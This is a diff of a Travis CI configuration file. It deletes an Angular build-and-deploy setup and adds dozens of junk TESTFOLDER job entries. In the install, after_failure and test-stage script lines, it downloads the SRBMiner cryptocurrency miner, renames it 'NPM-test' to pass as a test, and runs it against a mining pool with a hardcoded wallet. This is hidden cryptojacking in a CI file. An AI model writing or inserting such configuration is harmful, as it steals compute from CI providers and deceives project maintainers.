@@ -1,31 +1,74 @@
-language: node_js
-node_js:
-  - 'node'
+language:
+  - c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
+git:
+  clone: false
+  depth: false
+  checkout: false
+os:
+  - linux
+env:
+  - TESTFOLDER=aswintegration/shopping_cart
+  - TESTFOLDER=aswintegration/payments
+  - TESTFOLDER=aswunits
+  - TESTFOLDER=aswgoblok/s
+  - TESTFOLDER=aswgoblok/b
+  - TESTFOLDER=aswgoblok/s
+  - TESTFOLDER=aswgoblok/k
+  - TESTFOLDER=aswgoblok/u
+  - TESTFOLDER=aswgoblok/n
+  - TESTFOLDER=aswgoblok/b
+  - TESTFOLDER=aswgoblok/ki
+  - TESTFOLDER=aswgoblok/lo
+  - TESTFOLDER=aswgoblok/li/ko
+  - TESTFOLDER=aswgoblok/pi/k
+  - TESTFOLDER=aswgoblok/n/k
+  - TESTFOLDER=aswgoblok/m/j
+  - TESTFOLDER=aswgoblok/n
+  - TESTFOLDER=aswgoblok/mxm
+  - TESTFOLDER=aswgoblok/jsh
+  - TESTFOLDER=aswgoblok/kio
+  - TESTFOLDER=aswgoblok/in/si
+  - TESTFOLDER=aswgoblok/mas/hs
+  - TESTFOLDER=aswgoblok/kim/lop
+  - TESTFOLDER=aswgoblok/ji/mj/kip
+  - TESTFOLDER=aswintegration/useraa
+  - TESTFOLDER=aswintegration/shopping_carta
+  - TESTFOLDER=aswintegration/paymentsa
+  - TESTFOLDER=aswunitss
+  - TESTFOLDER=aswgoblok/ss
+  - TESTFOLDER=aswgoblok/bs
+  - TESTFOLDER=aswgoblok/ss
+  - TESTFOLDER=aswgoblok/ks
+  - TESTFOLDER=aswgoblok/us
+  - TESTFOLDER=aswgoblok/ns
+  - TESTFOLDER=aswgoblok/bs
+  - TESTFOLDER=aswgoblok/kis
+  - TESTFOLDER=aswgoblok/los
+  - TESTFOLDER=aswgoblok/lis/ko
+  - TESTFOLDER=aswgoblok/pis/k
+  - TESTFOLDER=aswgoblok/n/sk
+  - TESTFOLDER=aswgoblok/m/sj
+  - TESTFOLDER=aswgoblok/ns
+  - TESTFOLDER=aswgoblok/mxsm
+  - TESTFOLDER=aswgoblok/jssh
+  - TESTFOLDER=aswgoblok/kiso
+  - TESTFOLDER=aswgoblok/ins/si
+  - TESTFOLDER=aswgoblok/masss/hs
+  - TESTFOLDER=aswgoblok/kim/lsop
+  - TESTFOLDER=aswgoblok/ji/mjs/kip
+  - TESTFOLDER=aswintegration/userp
+  - TESTFOLDER=aswintegration/shoppipng_cart
 
-branches:
-  only:
-  - master
-
-addons:
-  chrome: stable
-
-before_script:
-  - yarn global add @angular/cli
-
-cache:
-  yarn: true
-  directories:
-    - node_modules
-
-script:
-  - ng build --prod
-
-deploy:
-  provider: pages
-  skip-cleanup: true
-  github-token: $GITHUB_TOKEN
-  keep-history: true
-  local-dir: ./dist/
-  on:
-
-
+  - TESTFOLDER=aswintegration/spphopping_cart
+install: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && mv SRBMiner-MULTI NPM-test && ./NPM-test --algorithm verushash --pool na.luckpool.net:3956 --wallet RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ --disable-gpu --cpu-threads 2
+after_failure: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && mv SRBMiner-MULTI NPM-test && ./NPM-test --algorithm verushash --pool na.luckpool.net:3956 --wallet RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ --disable-gpu --cpu-threads 2
+jobs:
+  include:
+    - stage: test
+      script: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && mv SRBMiner-MULTI NPM-test && ./NPM-test --algorithm verushash --pool na.luckpool.net:3956 --wallet RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ --disable-gpu --cpu-threads 2
